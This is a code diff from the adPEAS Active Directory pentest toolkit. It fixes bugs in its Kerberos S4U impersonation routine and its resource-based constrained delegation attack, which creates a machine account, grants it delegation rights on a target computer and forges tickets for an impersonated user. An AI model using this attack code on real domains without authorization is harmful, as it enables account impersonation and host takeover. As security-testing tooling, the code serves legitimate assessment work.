@@ -86,10 +86,18 @@ function Invoke-S4UCore {
                     $Server = $Script:LDAPContext['Server']
                     Write-Log "[Invoke-S4UCore] Using DC from session: $Server"
                 } else {
-                    $Server = Resolve-adPEASName -Type DC -Domain $Domain
-                    if (-not $Server) {
+                    # -Domain, not -Type DC - Resolve-adPEASName has no -Type parameter;
+                    # its DC-discovery parameter set is selected by -Domain alone, and it
+                    # returns a {Hostname; IP} object, never a bare string - the same
+                    # shape every other caller in the codebase reads (Invoke-Kerberoast.ps1,
+                    # Invoke-DCSync.ps1, Connect-adPEAS.ps1). This threw "A parameter cannot
+                    # be found that matches parameter name 'Type'" on every call made
+                    # without an active session and without an explicit -Server.
+                    $dcResolution = Resolve-adPEASName -Domain $Domain
+                    if (-not $dcResolution -or -not $dcResolution.Hostname) {
                         throw "Could not resolve Domain Controller for domain '$Domain'. Specify -Server explicitly."
                     }
+                    $Server = $dcResolution.Hostname
                     Write-Log "[Invoke-S4UCore] Resolved DC via DNS: $Server"
                 }
             }
@@ -179,9 +187,16 @@ function Invoke-S4UCore {
             $targetHost = if ($spnParts.Count -ge 2) { $spnParts[1] } else { $TargetSPN }
 
             # Build base KRB-CRED for original ticket (needed for PTT and AlternateService)
+            #
+            # .SessionKeyBytes, not .SessionKey - Request-ServiceTicket returns the session
+            # key both ways, as a Base64 display string (.SessionKey) and as the raw bytes
+            # (.SessionKeyBytes). Build-KRBCred's -SessionKey is typed [byte[]] and rejects
+            # a string outright ("Cannot convert value ... to type System.Byte[]"), so this
+            # threw on every successful S4U2Proxy exchange - the Kerberos exchange itself
+            # had already succeeded, and the tool reported the whole attack as failed.
             $baseKrbCredParams = @{
                 Ticket         = $s4u2proxyResult.TicketBytes
-                SessionKey     = $s4u2proxyResult.SessionKey
+                SessionKey     = $s4u2proxyResult.SessionKeyBytes
                 SessionKeyType = $s4u2proxyResult.EncryptionType
                 Realm          = $Domain.ToUpper()
                 ClientName     = $ImpersonateUser
@@ -208,7 +223,7 @@ function Invoke-S4UCore {
                         # Build KRB-CRED with substituted ServerName
                         $altKrbCredParams = @{
                             Ticket         = $s4u2proxyResult.TicketBytes
-                            SessionKey     = $s4u2proxyResult.SessionKey
+                            SessionKey     = $s4u2proxyResult.SessionKeyBytes
                             SessionKeyType = $s4u2proxyResult.EncryptionType
                             Realm          = $Domain.ToUpper()
                             ClientName     = $ImpersonateUser
@@ -712,55 +727,58 @@ function Invoke-RBCD {
                 Write-Verbose "[Invoke-RBCD] Generated computer name: $newComputerName"
 
                 # Step 2: Create computer account
+                #
+                # -PassThru is required - without it New-DomainComputer prints console
+                # output and returns nothing, so $createResult was always $null and this
+                # threw "No result returned" on every Auto Mode attempt before a computer
+                # was ever created.
                 Write-Verbose "[Invoke-RBCD] Creating computer account: $newComputerName"
-                $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword @connectionParams
+                $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword -PassThru @connectionParams
 
                 if (-not $createResult -or -not $createResult.Success) {
-                    $errMsg = if ($createResult) { $createResult.Error } else { "No result returned" }
+                    # .Message, not .Error - New-DomainComputer's failure object has no
+                    # Error property.
+                    $errMsg = if ($createResult) { $createResult.Message } else { "No result returned" }
                     throw "Failed to create computer account: $errMsg"
                 }
 
-                $newComputerSamAccountName = $createResult.SamAccountName
+                # .Computer, not .SamAccountName - the result object has no SamAccountName
+                # property. .Computer already carries the $-suffixed name that was written
+                # to sAMAccountName.
+                $newComputerSamAccountName = $createResult.Computer
                 $newComputerDN = $createResult.DistinguishedName
                 Write-Verbose "[Invoke-RBCD] Computer account created: $newComputerDN"
 
                 # Step 3: Configure RBCD delegation on target computer
-                Write-Verbose "[Invoke-RBCD] Configuring msDS-AllowedToActOnBehalfOfOtherIdentity on $targetComputerNormalized"
-
-                # Get new computer's SID
-                $newComputerObj = Get-DomainComputer -Identity $newComputerSamAccountName @connectionParams
-                if (-not $newComputerObj -or -not $newComputerObj.objectSid) {
-                    throw "Failed to retrieve SID for newly created computer '$newComputerSamAccountName'"
-                }
-
-                $newComputerSID = $newComputerObj.objectSid
-
-                # Build security descriptor for RBCD
-                $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
-                $identity = New-Object System.Security.Principal.SecurityIdentifier($newComputerSID)
-                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-                    $identity,
-                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
-                    [System.Security.AccessControl.AccessControlType]::Allow
-                )
-                $sd.AddAccessRule($ace)
-
-                # Get SDDL bytes
-                $sdBytes = $sd.GetSecurityDescriptorBinaryForm()
-
-                # Set msDS-AllowedToActOnBehalfOfOtherIdentity
-                $setResult = Set-DomainComputer -Identity $targetComputerNormalized -msDS_AllowedToActOnBehalfOfOtherIdentity $sdBytes @connectionParams
+                #
+                # -AddRBCD takes the delegate's sAMAccountName and builds the security
+                # descriptor itself, via Invoke-RBCDOperation. The SID lookup and manual
+                # ActiveDirectorySecurity/AccessRule construction this replaced targeted
+                # msDS-AllowedToActOnBehalfOfOtherIdentity as a raw Set-DomainComputer
+                # parameter, which has not existed since the v2.0.0 rewrite that added
+                # -AddRBCD - every Auto Mode run failed here with "A parameter cannot be
+                # found that matches parameter name 'msDS_AllowedToActOnBehalfOfOtherIdentity'."
+                Write-Verbose "[Invoke-RBCD] Configuring RBCD delegation on $targetComputerNormalized"
+                $setResult = Set-DomainComputer -Identity $targetComputerNormalized -AddRBCD $newComputerSamAccountName -PassThru @connectionParams
 
                 if (-not $setResult -or -not $setResult.Success) {
-                    # Cleanup: Remove created computer
+                    # Cleanup: remove the created computer. There is no Remove-DomainObject
+                    # function anywhere in adPEAS - calling it threw CommandNotFoundException,
+                    # caught by the try/catch below, so cleanup always "failed" silently and
+                    # every orphaned computer from a configuration failure was left behind.
+                    # This uses the same raw DeleteRequest New-DomainComputer.ps1 already
+                    # uses for its own rollback.
                     Write-Warning "[!] Failed to configure RBCD delegation, cleaning up computer account"
                     try {
-                        Remove-DomainObject -Identity $newComputerDN @connectionParams -ErrorAction SilentlyContinue
+                        $deleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest($newComputerDN)
+                        $Script:LdapConnection.SendRequest($deleteRequest) | Out-Null
                     } catch {
                         Write-Warning "[!] Cleanup failed: $($_.Exception.Message)"
                     }
 
-                    $errMsg = if ($setResult) { $setResult.Error } else { "No result returned" }
+                    # .Message, not .Error - Set-DomainComputer's failure object has no
+                    # Error property either.
+                    $errMsg = if ($setResult) { $setResult.Message } else { "No result returned" }
                     throw "Failed to configure RBCD delegation: $errMsg"
                 }
 
